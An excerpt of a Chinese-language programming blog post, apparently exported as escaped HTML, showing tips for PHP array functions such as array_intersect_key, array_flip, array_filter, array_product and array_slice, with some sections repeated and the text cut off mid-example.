title=\"获取指定键名之前 / 之后的数组\"></a>获取指定键名之前 / 之后的数组</h3><p>如果只想要关联数组中指定键名值之前的部分可以通过 <code>array_keys</code>、<code>array_search</code> 和 <code>array_slice</code> 组合使用便能够实现</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\"><span class=\"php\">$data = [<span class=\"string\">'first'</span> =&gt; <span class=\"number\">1</span>, <span class=\"string\">'second'</span> =&gt; <span class=\"number\">2</span>, <span class=\"string\">'third'</span> =&gt; <span class=\"number\">3</span>];</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">beforeKey</span><span class=\"params\">($array, $key)</span> </span>&#123;</span></span><br><span class=\"line\"><span class=\"php\">    $keys = array_keys($array);</span></span><br><span class=\"line\"><span class=\"php\">  \t<span class=\"comment\">// $keys = [0 =&gt; 'first', 1 =&gt; 'second', 2 =&gt; 'third']</span></span></span><br><span class=\"line\"><span class=\"php\">    $len = array_search($key, $keys);</span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">return</span> array_slice($array, <span class=\"number\">0</span>, $len);</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\">var_dump(beforeKey($data, <span class=\"string\">'first'</span>));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 []</span></span></span><br><span class=\"line\"><span class=\"php\">var_dump(beforeKey($data, <span class=\"string\">'second'</span>));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 ['first' =&gt; 1]</span></span></span><br><span class=\"line\"><span class=\"php\">var_dump(beforeKey($data, <span class=\"string\">'third'</span>));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 ['first' =&gt; 1, 'second' =&gt; 2]</span></span></span><br></pre></td></tr></table></figure>\n<p><code>array_slice</code> 这个函数取出部分数组是根据偏移量（可以理解为键名在数组中的顺序，从 0 开始）而不是根据键名的，而关联数组的键名却是是字符串或者是不按顺序的数字，此时要解决的问题便是「如何取到键名对应的偏移量」</p>\n<p><code>array_keys</code> 函数的功能是「返回数组中部分的或所有的键名」默认返回全部键名，此外返回的键名数组是以数字索引的，也就是说返回的键名数组的索引就是偏移量，的原数组变为：<code>[0 =&gt; &#39;first&#39;, 1 =&gt; &#39;second&#39;, 2 =&gt; &#39;third&#39;]</code> </p>\n<p>然后通过 <code>array_search</code> 便可以获得指定键名的偏移量了，因为这个函数的功能是「在数组中搜索给定的值，如果成功则返回首个相应的键名」</p>\n<p>有了偏移量直接调用 <code>array_slice</code> 函数便可以实现目的了</p>\n<p>那获取指定键名之后的数组也就轻而易举了，略微修改 array_slice 即可</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\"><span class=\"php\">$data = [<span class=\"string\">'first'</span> =&gt; <span class=\"number\">1</span>, <span class=\"string\">'second'</span> =&gt; <span class=\"number\">2</span>, <span class=\"string\">'third'</span> =&gt; <span class=\"number\">3</span>];</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">afterKey</span><span class=\"params\">($array, $key)</span> </span>&#123;</span></span><br><span class=\"line\"><span class=\"php\">    $keys = array_keys($array);</span></span><br><span class=\"line\"><span class=\"php\">    $offset = array_search($key, $keys);</span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">return</span> array_slice($array, $offset + <span class=\"number\">1</span>);</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\">var_dump(afterKey($data, <span class=\"string\">'first'</span>));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 ['second' =&gt; 2, 'third' =&gt; 3]</span></span></span><br><span class=\"line\"><span class=\"php\">var_dump(afterKey($data, <span class=\"string\">'second'</span>));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 ['third' =&gt; 3]</span></span></span><br><span class=\"line\"><span class=\"php\">var_dump(afterKey($data, <span class=\"string\">'third'</span>));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 []</span></span></span><br></pre></td></tr></table></figure>\n<p>获取指定值之前或之后的数组，只需调用 <code>beforeKey($data, array_search($value, $data))</code></p>\n<h3 id=\"数组中重复次数最多的值\"><a href=\"#数组中重复次数最多的值\" class=\"headerlink\" title=\"数组中重复次数最多的值\"></a>数组中重复次数最多的值</h3><p>假设有这样一个数组 <code>[6, 11, 11, 2, 4, 4, 11, 6, 7, 4, 2, 11, 8]</code>，如何获取数组中重复次数最多的值？关键在于 <code>array_count_values</code> 函数</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$data = [<span class=\"number\">6</span>, <span class=\"number\">11</span>, <span class=\"number\">11</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">4</span>, <span class=\"number\">11</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">4</span>, <span class=\"number\">2</span>, <span class=\"number\">11</span>, <span class=\"number\">8</span>];</span><br><span class=\"line\">$cv = array_count_values($data);</span><br><span class=\"line\"><span class=\"comment\">// $cv = [6 =&gt; 2, 11 =&gt; 4, 2 =&gt; 2, 4 =&gt; 3, 7 =&gt; 1, 8 =&gt; 1]</span></span><br><span class=\"line\">arsort($cv);</span><br><span class=\"line\">$max = <span class=\"type\">key</span>($cv);</span><br><span class=\"line\">var_dump($max);</span><br><span class=\"line\"><span class=\"comment\">// 结果 11</span></span><br></pre></td></tr></table></figure>\n<p><code>array_count_values</code>函数的功能是「统计数组中所有的值」，就是将原数组中的值作为返回数组的键名，值出现的次数作为返回数组的值</p>\n<p>这样便可以通过 <code>arsort</code> 函数对出现的次数进行降序排序并且保持索引关联</p>\n<p>最后使用 <code>key</code> 获得当前单元（当前单元默认为数组第一个成员）的键名，此时的键名即是原数组的值重复次数最多的值</p>\n","site":{"data":{}},"excerpt":"","more":"<p>PHP 的数组是一种很强大的数据类型，与此同时 PHP 内置了一系列与数组相关的函数可以很轻易的实现日常开发的功能，善用 PHP 内置函数能极大的提高开发效率和运行效率（内置函数都是用 C 写的效率比用 PHP 写的高很多）</p>\n<h3 id=\"取指定键名\"><a href=\"#取指定键名\" class=\"headerlink\" title=\"取指定键名\"></a>取指定键名</h3><p>对于某些关联数组，有时候我们只想取指定键名的那部分，比如数组为 <code>[&#39;id&#39; =&gt; 1, &#39;name&#39; =&gt; &#39;zane&#39;, &#39;password&#39; =&gt; &#39;123456&#39;]</code> 此时若只想取包含 id 和 name</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\"><span class=\"php\">$raw = [<span class=\"string\">'id'</span> =&gt; <span class=\"number\">1</span>, <span class=\"string\">'name'</span> =&gt; <span class=\"string\">'zane'</span>, <span class=\"string\">'password'</span> =&gt; <span class=\"string\">'123456'</span>];</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 自己用 PHP 实现</span></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">onlyKeys</span><span class=\"params\">($raw, $keys)</span> </span>&#123;</span></span><br><span class=\"line\"><span class=\"php\">    $new = [];</span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">foreach</span> ($raw <span class=\"keyword\">as</span> $key =&gt; $val) &#123;</span></span><br><span class=\"line\"><span class=\"php\">        <span class=\"keyword\">if</span> (in_array($key, $keys)) &#123;</span></span><br><span class=\"line\"><span class=\"php\">            $new[$key] = $val;</span></span><br><span class=\"line\"><span class=\"php\">        &#125;</span></span><br><span class=\"line\"><span class=\"php\">    &#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">return</span> $new;</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 用 PHP 内置函数实现</span></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">newOnlyKeys</span><span class=\"params\">($array, $keys)</span> </span>&#123;</span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">return</span> array_intersect_key($array, array_flip($keys));</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\">var_dump(onlyKeys($raw, [<span class=\"string\">'id'</span>, <span class=\"string\">'name'</span>]));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 ['id' =&gt; 1, 'name' =&gt; 'zane']</span></span></span><br><span class=\"line\"><span class=\"php\">var_dump(newOnlyKeys($raw, [<span class=\"string\">'id'</span>, <span class=\"string\">'name'</span>]));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 ['id' =&gt; 1, 'name' =&gt; 'zane']</span></span></span><br></pre></td></tr></table></figure>\n<p>简单的介绍一下这两个函数的作用，首先是 <code>array_flip</code> 函数，这个函数的功能是「将数组的键和值对调」，也就是键名变成值，值变成键名。我们传递的 $keys 参数经过这个函数便从 <code>[0 =&gt; &#39;id&#39;, 1 =&gt; &#39;name&#39;]</code> 转变为了 <code>[&#39;id&#39; =&gt; 0, &#39;name&#39; =&gt; 1]</code>。这样做的目的是为了向 <code>array_intersect_key</code> 函数服务，<code>array_intersect_key</code> 函数的功能是「使用键名比较计算数组的交集」，也就是返回第一个参数数组中与其他参数数组相同键名的值</p>\n<h3 id=\"移除指定键名\"><a href=\"#移除指定键名\" class=\"headerlink\" title=\"移除指定键名\"></a>移除指定键名</h3><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\"><span class=\"php\">$raw = [<span class=\"string\">'id'</span> =&gt; <span class=\"number\">1</span>, <span class=\"string\">'name'</span> =&gt; <span class=\"string\">'zane'</span>, <span class=\"string\">'password'</span> =&gt; <span class=\"string\">'123456'</span>];</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 用 PHP 内置函数实现</span></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">removeKeys</span><span class=\"params\">($array, $keys)</span> </span>&#123;</span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">return</span> array_diff_key($array, array_flip($keys));</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 移除 id 键</span></span></span><br><span class=\"line\"><span class=\"php\">var_dump(removeKeys($raw, [<span class=\"string\">'id'</span>, <span class=\"string\">'password'</span>]));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 ['name' =&gt; 'zane']</span></span></span><br></pre></td></tr></table></figure>\n<p>和上一个例子相比本例只是将 <code>array_intersect_key</code> 函数改为 <code>array_diff_key</code>(刚好和 <code>array_intersect_key</code> 的功能相反)</p>\n<h3 id=\"数组去重\"><a href=\"#数组去重\" class=\"headerlink\" title=\"数组去重\"></a>数组去重</h3><p>PHP 内置了 array_unique 函数</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\"><span class=\"php\">$input = [<span class=\"string\">'you are'</span> =&gt; <span class=\"number\">666</span>, <span class=\"string\">'i am'</span> =&gt; <span class=\"number\">233</span>, <span class=\"string\">'he is'</span> =&gt; <span class=\"number\">233</span>, <span class=\"string\">'she is'</span> =&gt; <span class=\"number\">666</span>];</span></span><br><span class=\"line\"><span class=\"php\">$result = array_unique($input);</span></span><br><span class=\"line\"><span class=\"php\">var_dump($result);</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 ['you are' =&gt; 666, 'i am' =&gt; 233]</span></span></span><br></pre></td></tr></table></figure>\n<p>用这个函数就能解决大部分问题了，但是有时候可能会觉得它不够快，原因如下：</p>\n<ul>\n<li><p>array_unique() 先将值作为字符串排序，然后对每个值只保留第一个遇到的键名，接着忽略所有后面的键名</p>\n</li>\n<li><p>因为这个函数会先将数组进行排序，所以速度可能在某些场景达不到预期的要求</p>\n</li>\n</ul>\n<p>续调用两次 <code>array_flip</code> 函数是不是就相当于实现了 <code>array_unique</code> 函数的功能？</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\"><span class=\"php\">$input = [<span class=\"string\">'you are'</span> =&gt; <span class=\"number\">666</span>, <span class=\"string\">'i am'</span> =&gt; <span class=\"number\">233</span>, <span class=\"string\">'he is'</span> =&gt; <span class=\"number\">233</span>, <span class=\"string\">'she is'</span> =&gt; <span class=\"number\">666</span>];</span></span><br><span class=\"line\"><span class=\"php\">$result = array_flip(array_flip($input));</span></span><br><span class=\"line\"><span class=\"php\">var_dump($result);</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 ['she is' =&gt; 666, 'he is' =&gt; 233]</span></span></span><br></pre></td></tr></table></figure>\n<p>结果和 array_unique 的不一样，我们可以从 PHP 官方手册得到答案</p>\n<blockquote>\n<p>如果同一个值出现多次，则最后一个键名将作为它的值，其它键会被丢弃</p>\n</blockquote>\n<p><code>array_unique</code> 保留第一个出现的键名，<code>array_flip</code>保留最后一个出现的键名</p>\n<p><strong>注意：</strong> 使用 array_flip 作为数组去重时数组的值必须能够作为键名（即为 string 类型或 integer 类型），否则这个值将被忽略</p>\n<p>此外，若不需要保留键名可以直接这样使用 <code>array_values(array_flip($input))</code></p>\n<h3 id=\"重置索引\"><a href=\"#重置索引\" class=\"headerlink\" title=\"重置索引\"></a>重置索引</h3><p>当想要对一个索引并不连续的数组进行重置时，比如数组：<code>[0 =&gt; 233, 99 =&gt; 666]</code>，对于这种数组我们只需要调用 <code>array_values</code> 函数即可实现</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\"><span class=\"php\">$input = [<span class=\"number\">0</span> =&gt; <span class=\"number\">233</span>, <span class=\"number\">99</span> =&gt; <span class=\"number\">666</span>];</span></span><br><span class=\"line\"><span class=\"php\">var_dump(array_values($input));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 [0 =&gt; 233, 1 =&gt; 66]</span></span></span><br></pre></td></tr></table></figure>\n<p>需要注意的是 <code>array_values</code> 函数并不止重置数字索引还会将字符串键名也同样删除并重置，如果想要保留字符串键名的同时重置数字索引，使用 <code>array_slice</code> 函数</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\"><span class=\"php\">$input = [<span class=\"string\">'hello'</span> =&gt; <span class=\"string\">'world'</span>, <span class=\"number\">0</span> =&gt; <span class=\"number\">233</span>, <span class=\"number\">99</span> =&gt; <span class=\"number\">666</span>];</span></span><br><span class=\"line\"><span class=\"php\">var_dump(array_slice($input, <span class=\"number\">0</span>));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 ['hello' =&gt; 'world', 0 =&gt; 233, 1 =&gt; 66]</span></span></span><br></pre></td></tr></table></figure>\n<p><code>array_slice</code> 函数的功能是取出数组的中的一段，但它默认会重新排序并重置数组的数字索引，所以可以利用它重置数组中的数字索引</p>\n<h3 id=\"清除空值\"><a href=\"#清除空值\" class=\"headerlink\" title=\"清除空值\"></a>清除空值</h3><p>有时候想清除某个数组中的空值比如：null、false、0、0.0、[]空数组、’’空字符串、’0’字符串0 ，这时 <code>array_filter</code> 函数便能帮上忙</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\"><span class=\"php\">$input = [<span class=\"string\">'foo'</span>, <span class=\"keyword\">false</span>, <span class=\"number\">-1</span>, <span class=\"keyword\">null</span>, <span class=\"string\">''</span>, []];</span></span><br><span class=\"line\"><span class=\"php\">var_dump(array_filter($input));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 [0 =&gt; 'foo', 2 =&gt; -1]</span></span></span><br></pre></td></tr></table></figure>\n<p>array_filter 的作用其实是「用回调函数过滤数组中的单元」，它的第二个参数其实是个回调函数，向数组的每个成员都执行这个回调函数，若回调函数的返回值为 true 便保留这个成员，为 false 则忽略。这个函数还有一个特性就是：</p>\n<blockquote>\n<p>如果没有提供 callback 函数， 将删除 array 中所有等值为 FALSE 的条目</p>\n</blockquote>\n<p><strong>注意：</strong> 如果不填写 callback 函数，0、0.0、’0’字符串0 这些可能有意义的值会被删除。所以如果清除的规则有所不同还需要自行编写 callback 函数</p>\n<h3 id=\"确认数组成员全部为真\"><a href=\"#确认数组成员全部为真\" class=\"headerlink\" title=\"确认数组成员全部为真\"></a>确认数组成员全部为真</h3><p>有时候我们希望确认数组中的的值全部为 true，比如：<code>[&#39;read&#39; =&gt; true, &#39;write&#39; =&gt; true, &#39;execute&#39; =&gt; true]</code>，只需要用 <code>array_product</code> 函数便可以实现了</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\"><span class=\"php\">$power = [<span class=\"string\">'read'</span> =&gt; <span class=\"keyword\">true</span>, <span class=\"string\">'write'</span> =&gt; <span class=\"keyword\">true</span>, <span class=\"string\">'execute'</span> =&gt; <span class=\"keyword\">true</span>];</span></span><br><span class=\"line\"><span class=\"php\">var_dump((bool)array_product($power));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 true</span></span></span><br><span class=\"line\"><span class=\"php\">$power = [<span class=\"string\">'read'</span> =&gt; <span class=\"keyword\">true</span>, <span class=\"string\">'write'</span> =&gt; <span class=\"keyword\">true</span>, <span class=\"string\">'execute'</span> =&gt; <span class=\"keyword\">false</span>];</span></span><br><span class=\"line\"><span class=\"php\">var_dump((bool)array_product($power));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 false</span></span></span><br></pre></td></tr></table></figure>\n<p>array_product 函数本来的功能是「计算数组中所有值的乘积」，在累乘数组中所有成员的时候会将成员的值转为数值类型。当传递的参数为一个 bool  成员所组成的数组时，true 会被转为 1，false 会被转为 0。然后只要数组中出现一个 false 累乘的结果自然会变成 0，然后再将结果转为 bool 类型不就是 false</p>\n<p><strong>注意：</strong> 使用 array_product 函数将在计算过程中将数组成员转为数值类型进行计算，所以请确保了解数组成员转为数值类型后的值，否则会产生意料之外的结果</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\"><span class=\"php\">$power = [<span class=\"string\">'read'</span> =&gt; <span class=\"keyword\">true</span>, <span class=\"string\">'write'</span> =&gt; <span class=\"keyword\">true</span>, <span class=\"string\">'execute'</span> =&gt; <span class=\"string\">'true'</span>];</span></span><br><span class=\"line\"><span class=\"php\">var_dump((bool)array_product($power));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 false</span></span></span><br></pre></td></tr></table></figure>\n<p>因为 ‘true’ 在计算过程中被转为 0</p>\n<h3 id=\"获取指定键名之前-之后的数组\"><a href=\"#获取指定键名之前-之后的数组\" class=\"headerlink\" title=\"获取指定键名之前 / 之后的数组\"></a>获取指定键名之前 / 之后的数组</h3><p>如果只想要关联数组中指定键名值之前的部分可以通过 <code>array_keys</code>、<code>array_search</code> 和 <code>array_slice</code> 组合使用便能够实现</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\"><span class=\"php\">$data = [<span class=\"string\">'first'</span> =&gt; <span class=\"number\">1</span>, <span class=\"string\">'second'</span> =&gt; <span class=\"number\">2</span>, <span class=\"string\">'third'</span> =&gt; <span class=\"number\">3</span>];</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">beforeKey</span><span class=\"params\">($array, $key)</span> </span>&#123;</span></span><br><span class=\"line\"><span class=\"php\">    $keys = array_keys($array);</span></span><br><span class=\"line\"><span class=\"php\">  \t<span class=\"comment\">// $keys = [0 =&gt; 'first', 1 =&gt; 'second', 2 =&gt; 'third']</span></span></span><br><span class=\"line\"><span class=\"php\">    $len = array_search($key, $keys);</span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">return</span> array_slice($array, <span class=\"number\">0</span>, $len);</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\">var_dump(beforeKey($data, <span class=\"string\">'first'</span>));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 []</span></span></span><br><span class=\"line\"><span class=\"php\">var_dump(beforeKey($data, <span class=\"string\">'second'</span>));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 ['first' =&gt; 1]</span></span></span><br><span class=\"line\"><span class=\"php\">var_dump(beforeKey($data, <span class=\"string\">'third'</span>));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 ['first' =&gt; 1, 'second' =&gt; 2]</span></span></span><br></pre></td></tr></table></figure>\n<p><code>array_slice</code> 这个函数取出部分数组是根据偏移量（可以理解为键名在数组中的顺序，从 0 开始）而不是根据键名的，而关联数组的键名却是是字符串或者是不按顺序的数字，此时要解决的问题便是「如何取到键名对应的偏移量」</p>\n<p><code>array_keys</code> 函数的功能是「返回数组中部分的或所有的键名」默认返回全部键名，此外返回的键名数组是以数字索引的，也就是说返回的键名数组的索引就是偏移量，的原数组变为：<code>[0 =&gt; &#39;first&#39;, 1 =&gt; &#39;second&#39;, 2 =&gt; &#39;third&#39;]</code> </p>\n<p>然后通过 <code>array_search</code> 便可以获得指定键名的偏移量了，因为这个函数的功能是「在数组中搜索给定的值，如果成功则返回首个相应的键名」</p>\n<p>有了偏移量直接调用 <code>array_slice</code> 函数便可以实现目的了</p>\n<p>那获取指定键名之后的数组也就轻而易举了，略微修改 array_slice 即可</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\"><span class=\"php\">$data = [<span class=\"string\">'first'</span> =&gt; <span class=\"number\">1</span>, <span class=\"string\">'second'</span> =&gt; <span class=\"number\">2</span>, <span class=\"string\">'third'</span> =&gt; <span class=\"number\">3</span>];</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">afterKey</span><span class=\"params\">($array, $key)</span> </span>&#123;</span></span><br><span class=\"line\"><span class=\"php\">    $keys = array_keys($array);</span></span><br><span class=\"line\"><span class=\"php\">    $offset = array_search($key, $keys);</span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">return</span> array_slice($array, $offset + <span class=\"number\">1</span>);</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\">var_dump(afterKey($data, <span class=\"string\">'first'</span>));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 ['second' =&gt; 2, 'third' =&gt; 3]</span></span></span><br><span class=\"line\"><span class=\"php\">var_dump(afterKey($data, <span class=\"string\">'second'</span>));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 ['third' =&gt; 3]</span></span></span><br><span class=\"line\"><span class=\"php\">var_dump(afterKey($data, <span class=\"string\">'third'</span>));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 []</span></span></span><br></pre></td></tr></table></figure>\n<p>获取指定值之前或之后的数组，只需调用 <code>beforeKey($data, array_search($value, $data))</code></p>\n<h3 id=\"数组中重复次数最多的值\"><a href=\"#数组中重复次数最多的值\" class=\"headerlink\" title=\"数组中重复次数最多的值\"></a>数组中重复次数最多的值</h3><p>假设有这样一个数组 <code>[6, 11, 11, 2, 4, 4, 11, 6, 7, 4, 2, 11, 8]</code>，如何获取数组中重复次数最多的值？关键在于 <code>array_count_values</code> 函数</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$data = [<span class=\"number\">6</span>, <span class=\"number\">11</span>, <span class=\"number\">11</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">4</span>, <span class=\"number\">11</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">4</span>, <span class=\"number\">2</span>, <span class=\"number\">11</span>, <span class=\"number\">8</span>];</span><br><span class=\"line\">$cv = array_count_values($data);</span><br><span class=\"line\"><span class=\"comment\">// $cv = [6 =&gt; 2, 11 =&gt; 4, 2 =&gt; 2, 4 =&gt; 3, 7 =&gt; 1, 